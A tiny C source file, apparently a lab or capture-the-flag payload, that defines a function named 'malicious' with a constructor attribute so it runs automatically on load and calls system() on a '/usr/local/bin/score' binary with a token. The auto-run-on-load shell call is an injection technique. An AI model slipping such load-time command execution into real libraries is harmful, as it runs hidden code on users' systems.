#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score e670912a-71b4-4f5a-aae8-4a59ae47e98f");
}
